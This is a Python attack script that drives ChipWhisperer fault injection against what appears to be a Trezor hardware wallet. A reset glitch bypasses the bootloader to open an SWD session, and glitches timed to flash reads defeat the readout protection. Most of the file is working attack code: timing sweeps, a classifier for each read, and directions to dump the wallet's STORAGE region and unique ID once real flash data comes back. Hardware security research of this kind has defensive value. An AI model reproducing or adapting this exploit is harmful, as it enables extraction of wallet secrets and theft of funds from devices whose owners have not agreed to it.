#!/usr/bin/env python3
"""
Two-glitch flash read (my own script), tuned for the all-zeros failure mode.

Phase 1 - bootloader bypass: glitch at reset (tio4, ext_offset 17000) to open
          the SWD session (proven 1-trezor_fun.py timing).
Phase 2 - glitch during the read: trigger on SWDIO (tio3), glitch while reading
          flash to defeat the RDP check on that transaction.

Key tuning: a read that returns ZERO with no fault means the glitch DID bypass
the check but the pulse was too wide and corrupted the data. SecGlitcher's fix
is the shortest feasible glitch, so phase 2 sweeps narrow->wide widths and
classifies every read:  FAULT (timing miss) / ZERO (bypassed but corrupted,
narrow the width) / FF (erased) / REAL (valid flash data).

Crowbar torn down on exit. Non-interactive. Bounded by MAX_READS.
"""
import os, sys, time, signal, atexit
from collections import Counter
import chipwhisperer as cw

# phase-1 (bootloader bypass)
P1_EXT, P1_WIDTH, P1_OFF, P1_REPEAT = int(os.environ.get("P1_EXT", 17000)), 40, -45, 20

# phase-2 (during-read) — SecGlitcher: shortest feasible glitch fixes the zeros.
G2_WIDTHS  = [int(x) for x in os.environ.get("G2_WIDTHS", "6,10,14,18,22,26,30,34,38").split(",")]
G2_OFF     = int(os.environ.get("G2_OFF", -45))
G2_REPEAT  = int(os.environ.get("G2_REPEAT", 6))
G2_EXT_MIN = int(os.environ.get("G2_EXT_MIN", 0))      # ext_offset after SWDIO edge
G2_EXT_MAX = int(os.environ.get("G2_EXT_MAX", 1000))
G2_STEP    = int(os.environ.get("G2_STEP", 25))
G2_SAMPLES = int(os.environ.get("G2_SAMPLES", 4))
MAX_READS  = int(os.environ.get("MAX_READS", 600))

FLASH_CANARY = int(os.environ.get("FLASH_CANARY", str(0x08000000)), 0)
DBGMCU, EXPECT = 0xE0042000, 0x200F6411

def usb_reset():
    os.system("/home/tdaly/.cwvenv/usb_reset > /dev/null 2>&1")

scope = cw.scope()
scope.io.target_pwr = "high_z"
scope.clock.clkgen_freq  = 100e6
scope.glitch.clk_src     = "clkgen"
scope.glitch.output      = "enable_only"
scope.glitch.trigger_src = "ext_single"
scope.io.glitch_lp = True
scope.io.glitch_hp = True

def reboot_flush():
    scope.io.target_pwr = False
    scope.io.nrst = False
    scope.arm()
    scope.io.nrst = "high_z"
    scope.io.target_pwr = True

_torn = False
def teardown(*_):
    global _torn
    if _torn: return
    _torn = True
    for a, v in (("glitch_hp", False), ("glitch_lp", False),
                 ("target_pwr", False), ("nrst", "high_z")):
        try: setattr(scope.io, a, v)
        except Exception: pass
    try: scope.dis()
    except Exception: pass
atexit.register(teardown)
def _sig(*_):
    print("\n⚠ interrupt -> teardown"); teardown(); sys.exit(0)
signal.signal(signal.SIGINT, _sig)
signal.signal(signal.SIGTERM, _sig)

def valid_vectors(data):
    if not data or len(data) < 8: return False
    if all(b == 0 for b in data) or all(b == 0xFF for b in data): return False
    sp  = int.from_bytes(data[0:4], "little")
    rst = int.from_bytes(data[4:8], "little")
    return 0x20000000 <= sp <= 0x20020000 and 0x08000000 <= rst <= 0x08100000

def open_session():
    scope.trigger.triggers = "tio4"
    scope.glitch.width, scope.glitch.offset, scope.glitch.repeat = P1_WIDTH, P1_OFF, P1_REPEAT
    for _ in range(40):
        scope.glitch.ext_offset = P1_EXT
        reboot_flush(); time.sleep(2)
        scope.io.glitch_hp = False; scope.io.glitch_hp = True
        scope.io.glitch_lp = False; scope.io.glitch_lp = True
        try:
            import swd
            usb_reset(); time.sleep(0.4)
            dev = swd.Swd()
            if int.from_bytes(bytes(dev.read_mem(DBGMCU, 4)), "little") == EXPECT:
                return dev
        except Exception:
            pass
    return None

def classify(dev):
    try:
        data = bytes(dev.read_mem(FLASH_CANARY, 16))
    except Exception:
        return "FAULT", None
    if valid_vectors(data):              return "REAL", data
    if all(b == 0 for b in data):        return "ZERO", data
    if all(b == 0xFF for b in data):     return "FF", data
    return "DATA", data

print("=" * 64)
print("Two-glitch flash read: bypass (tio4) -> during-read glitch (tio3)")
print(f"  canary 0x{FLASH_CANARY:08X}  widths {G2_WIDTHS}  repeat {G2_REPEAT}")
print(f"  phase2 ext_offset {G2_EXT_MIN}..{G2_EXT_MAX} step {G2_STEP}, {G2_SAMPLES}/pt")
print("=" * 64)

reboot_flush()
print("\n[phase 1] opening SWD via bootloader-bypass glitch ...")
dev = open_session()
if dev is None:
    print("  could not open session; re-run."); sys.exit(0)
print("  session open (DBGMCU verified).")
try:
    dev.read_mem(FLASH_CANARY, 16)
    print("  NOTE: flash read succeeded with NO read-glitch (unexpected).")
except Exception as e:
    print(f"  baseline: flash faults without read-glitch ({str(e)[:28]}).")

print("\n[phase 2] glitching during flash reads ...")
scope.trigger.triggers = "tio3"
scope.io.tio3 = "high_z"
scope.glitch.offset, scope.glitch.repeat = G2_OFF, G2_REPEAT

reads = 0; hit = None; grand = Counter()
for width in G2_WIDTHS:
    scope.glitch.width = width
    for eo in range(G2_EXT_MIN, G2_EXT_MAX + 1, G2_STEP):
        scope.glitch.ext_offset = eo
        c = Counter()
        for _ in range(G2_SAMPLES):
            reads += 1
            scope.arm()
            cls, data = classify(dev)
            c[cls] += 1; grand[cls] += 1
            if cls == "REAL":
                hit = (width, eo, data); break
            if cls == "FAULT":
                try:
                    import swd; usb_reset(); time.sleep(0.2); dev = swd.Swd()
                except Exception:
                    dev = None
                if dev is None:
                    dev = open_session()
                    if dev is None: hit = "lost"; break
                    scope.trigger.triggers = "tio3"; scope.io.tio3 = "high_z"
                    scope.glitch.width, scope.glitch.offset, scope.glitch.repeat = width, G2_OFF, G2_REPEAT
            if reads >= MAX_READS: break
        if c.get("ZERO") or c.get("DATA") or c.get("FF"):
            print(f"  w={width:2d} eo={eo/100:6.1f}us  {dict(c)}  <-- bypassing, narrow width to recover data", flush=True)
        if hit or reads >= MAX_READS: break
    if hit or reads >= MAX_READS: break

print("\n" + "=" * 64)
print(f"tally over {reads} reads: {dict(grand)}")
if isinstance(hit, tuple):
    width, eo, data = hit
    print(f"💥 REAL FLASH DATA  width={width} ext_offset={eo} ({eo/100:.1f}us)")
    print(f"   0x{FLASH_CANARY:08X}: {data.hex()}")
    print("   -> lock these, then dump STORAGE 0x08008000 + UNIQUE_ID 0x1FFF7A10")
elif grand.get("ZERO"):
    print("No REAL read, but ZERO reads occurred -> you ARE bypassing the check.")
    print("Narrow G2_WIDTHS further (try 2,4,6,8) at those ext_offsets.")
else:
    print("Only faults -> timing window is wrong. Set G2_EXT_MIN/MAX to where you")
    print("previously saw zeros (e.g. your 4-dump_flash RANGE5 ~130000-195000).")
print("=" * 64)
